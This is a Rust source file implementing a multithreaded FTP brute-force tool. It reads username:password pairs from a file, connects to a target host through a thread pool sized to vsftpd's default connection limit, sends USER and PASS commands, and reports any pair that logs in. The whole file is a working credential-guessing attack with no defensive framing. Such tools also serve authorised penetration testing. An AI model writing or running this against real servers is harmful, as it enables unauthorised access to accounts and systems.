mod constants;
mod threadpool;

use clap::Parser;
use constants::MAX_MESSAGE_SIZE;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::sync::mpsc::{channel, Receiver, Sender};
use std::sync::MutexGuard;
use std::usize;
use std::{
    io::{Read, Result, Seek, SeekFrom, Write},
    net::TcpStream,
    sync::{Arc, Condvar, Mutex},
    time::Instant,
    vec::Vec,
};
use threadpool::ThreadPool;

#[derive(Parser, Debug)]
struct Args {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    host: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}

const CHUNK_AMOUNT: usize = 10;

fn main() -> Result<()> {
    let args = Args::parse();
    println!("Starting...");
    let now = Instant::now();
    let host = args.host;
    let mut cred_file = BufReader::new(File::open(&args.credentials)?);
    let cred_count = get_cred_count(&mut cred_file);
    println!("credential count {}", cred_count);
    // vsftpd default max conn = 5
    let pool = ThreadPool::new(4);
    let pair = Arc::new((Mutex::new(false), Condvar::new()));
    let (sender, receiver): (Sender<u32>, Receiver<u32>) = channel();
    let reader = Arc::new(Mutex::new(cred_file));
    for _ in 0..cred_count / CHUNK_AMOUNT {
        let reader = reader.clone();
        let host = host.clone();
        let pair2 = pair.clone();
        let sender = sender.clone();
        pool.execute(move || {
            let guard = reader.lock().unwrap();
            match get_chunk(guard) {
                Some(chunk) => {
                    let mut buffer = [0; MAX_MESSAGE_SIZE];
                    let mut stream = TcpStream::connect(host).unwrap();
                    stream.read(&mut buffer).unwrap();
                    // [50,50,48] = 220 = ready for new users
                    if buffer[..3] == [50, 50, 48] {
                        for cred in chunk {
                            match attempt(&cred, &mut stream, &sender) {
                                Ok(code) => {
                                    if code == 1 {
                                        println!("------------- SUCCESS -------------");
                                        println!("{}", cred);
                                        println!("------------- SUCCESS -------------");
                                        let &(ref lock, ref cvar) = &*pair2;
                                        let mut done = lock.lock().unwrap();
                                        *done = true;
                                        // We notify the condvar that the value has changed.
                                        cvar.notify_one();
                                    }
                                }
                                Err(err) => {
                                    println!("{:}", err)
                                }
                            }
                        }
                    }
                }
                None => {}
            }
        })
    }
    // wait for the thread to start up
    let &(ref lock, ref cvar) = &*pair;
    let mut done = lock.lock().unwrap();
    while !*done {
        done = cvar.wait(done).unwrap();
    }
    println!("Total attempts {}", receiver.try_iter().count());
    println!("Total time elapsed: {}", now.elapsed().as_secs());
    return Ok(());
}

fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
    if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
        match sender.send(1) {
            Ok(_) => {}
            Err(err) => {
                println!("{}", err)
            }
        }
        println!("attempting: {} {}", username, password);
        stream.write(format!("USER {}\r\n", username).as_bytes())?;
        let mut buffer = [0; MAX_MESSAGE_SIZE];
        stream.read(&mut buffer)?;
        // code 331 (User name okay, need password)
        if buffer[..3] == [51, 51, 49] {
            stream.write(format!("PASS {}\r\n", password).as_bytes())?;
            stream.read(&mut buffer)?;
            // code 230 (User logged in, proceed. Logged out if appropriate)
            if buffer[..3] == [50, 51, 48] {
                return Ok(1);
            }
        }
    }
    return Ok(0);
}

fn get_cred_count(reader: &mut BufReader<File>) -> usize {
    let mut cred_count: usize = reader.lines().count();
    if cred_count % CHUNK_AMOUNT > 0 {
        cred_count = cred_count + (CHUNK_AMOUNT - cred_count % CHUNK_AMOUNT)
    }
    reader.seek(SeekFrom::Start(0));
    return cred_count;
}

fn get_chunk(mut reader: MutexGuard<BufReader<File>>) -> Option<Vec<String>> {
    let mut chunk: Vec<String> = Vec::new();
    for _ in 0..CHUNK_AMOUNT {
        let mut line = String::new();
        match reader.read_line(&mut line) {
            Ok(res) => {
                if res == 0 {
                    return None;
                } else {
                    chunk.push(line.replace('\n', ""));
                }
            }
            Err(err) => {
                println!("Error reading to buffer {}", err);
            }
        }
    }
    Some(chunk)
}
